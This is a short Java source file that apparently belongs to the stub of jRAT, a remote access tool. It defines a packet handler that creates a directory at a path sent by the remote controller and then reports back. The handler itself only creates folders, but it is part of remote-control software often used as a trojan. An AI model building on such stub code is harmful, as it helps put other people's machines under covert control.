package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Constants;

import java.io.File;


public class Packet43CreateDirectory extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String where = con.readLine();
		String name = con.readLine();

		File file = new File(where + File.separator + name);
		file.mkdirs();
		con.status(Constants.STATUS_MKDIR);
	}

}